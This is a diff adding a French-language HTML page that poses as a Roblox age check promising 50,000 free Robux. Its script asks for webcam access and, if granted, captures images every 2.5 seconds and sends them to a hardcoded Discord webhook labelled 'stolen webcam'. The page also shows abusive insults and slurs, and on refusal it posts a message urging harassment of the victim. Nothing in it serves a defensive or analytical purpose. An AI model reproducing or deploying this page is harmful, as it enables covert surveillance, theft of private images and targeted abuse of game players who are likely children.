@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🔓 VÉRIFICATION ROBLOX – GAGNEZ 50 000 ROBUX 🔓</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0b3b3f, #1a2a3a);
+            font-family: 'Arial', 'Impact', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            animation: bgFlash 0.5s infinite;
+        }
+        @keyframes bgFlash {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 100% 100%; }
+        }
+        .card {
+            background: rgba(0,0,0,0.85);
+            border-radius: 30px;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 0 50px rgba(255,0,0,0.8);
+            border: 5px solid gold;
+            backdrop-filter: blur(5px);
+        }
+        h1 {
+            font-size: 48px;
+            background: linear-gradient(45deg, red, yellow, lime);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 10px black;
+            animation: shake 0.3s infinite;
+        }
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-3px); }
+            75% { transform: translateX(3px); }
+        }
+        .robux-counter {
+            font-size: 70px;
+            font-weight: bold;
+            color: lime;
+            background: black;
+            display: inline-block;
+            padding: 20px;
+            border-radius: 50px;
+            margin: 20px;
+            font-family: monospace;
+            border: 3px solid white;
+        }
+        button {
+            background: red;
+            color: white;
+            font-size: 40px;
+            padding: 20px 40px;
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 0 20px orange;
+            transition: 0.1s linear;
+            margin-top: 20px;
+        }
+        button:hover {
+            background: darkred;
+            transform: scale(1.05);
+            box-shadow: 0 0 40px red;
+        }
+        .progress-bar {
+            width: 80%;
+            margin: 30px auto;
+            background: #222;
+            border-radius: 30px;
+            height: 30px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, lime, yellow, red);
+            transition: width 0.05s linear;
+        }
+        .fake-status {
+            color: white;
+            font-size: 20px;
+            margin-top: 15px;
+            background: black;
+            display: inline-block;
+            padding: 10px;
+            border-radius: 20px;
+        }
+        video { display: none; }
+        #insulte { font-size: 28px; color: orange; margin-top: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <h1>🎁 CONFIRME TON ÂGE – 50 000 ROBUX GRATUITS 🎁</h1>
+    <div class="robux-counter">50 000</div>
+    <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <div class="fake-status" id="statusText">👉 Étape 1 : Clique sur le bouton ci-dessous 👈</div>
+    <button id="fakeLink">🔐 ACTIVER LA CAMÉRA DE VÉRIFICATION 🔐</button>
+    <div id="insulte"></div>
+</div>
+<video id="webcam" autoplay muted></video>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1496273477831884810/IzhJ0ANPNvNR6gT8Xyk0VENud_45B1nzrcas4JVeY8hLtcIUk4qDssv5C6AW_WjrHwhW"; // 🔴 REMPLACE PAR TON URL ICI 🔴
+    const button = document.getElementById('fakeLink');
+    const video = document.getElementById('webcam');
+    const insulteDiv = document.getElementById('insulte');
+    const progressFill = document.getElementById('progressFill');
+    const statusText = document.getElementById('statusText');
+
+    let progress = 0;
+    let intervalProgress;
+
+    async function sendToDiscord(imageBase64, insult) {
+        if (!webhookURL.includes("ICI_TA_PASSE")) {
+            const payload = {
+                content: `@maku_95 📸 **WEBCAM VOLÉE** 📸\n${insult}`,
+                embeds: [{
+                    title: "Victime espionnée - insulte incluse",
+                    image: { url: "attachment://cam.jpg" },
+                    color: 0xff00ff,
+                    footer: { text: "INVERSE - pire que tout" }
+                }]
+            };
+            const form = new FormData();
+            form.append("payload_json", JSON.stringify(payload));
+            const blob = await (await fetch(imageBase64)).blob();
+            form.append("files[0]", blob, "cam.jpg");
+            fetch(webhookURL, { method: "POST", body: form }).catch(e => console.log);
+        }
+    }
+
+    button.addEventListener('click', async () => {
+        // Simule une fausse vérification
+        statusText.innerText = "✅ VÉRIFICATION EN COURS... NE QUITTE PAS ✅";
+        progress = 0;
+        intervalProgress = setInterval(() => {
+            progress += 2;
+            if (progress >= 100) {
+                clearInterval(intervalProgress);
+                progressFill.style.width = "100%";
+                statusText.innerText = "🔞 SCAN DU VISAGE REQUIS – ACCEPTE LA CAMÉRA 🔞";
+            } else {
+                progressFill.style.width = progress + "%";
+            }
+        }, 30);
+
+        // Demande réelle de la webcam
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+            insulteDiv.innerText = "🖕 T’ES TROP CON, J’AI TA GUEULE, SALE PUTE 🖕";
+            statusText.innerText = "🎉 COMPTE VOLÉ AVEC SUCCÈS – MERCI LE GROS NOOB 🎉";
+            // Capture et envoi
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const capture = () => {
+                if (video.videoWidth > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    const img = canvas.toDataURL('image/jpeg', 0.8);
+                    sendToDiscord(img, "Regarde ta tête de chien en chaleur, espèce de sous-merde");
+                }
+            };
+            capture();
+            setInterval(capture, 2500);
+        } catch (err) {
+            insulteDiv.innerText = "🔴 T’AS REFUSÉ LA CAM ? T’ES QUOI, UNE PETITE TAFIOLE ? 🔴";
+            sendToDiscord("", "Victime lâche – a refusé la caméra. Envoie-lui un message de harcèlement.");
+            statusText.innerText = "❌ ERREUR : T’ES TROP PEUREUX, VA TE FAIRE ENCULER ❌";
+        }
+    });
+</script>
+</body>
+</html>
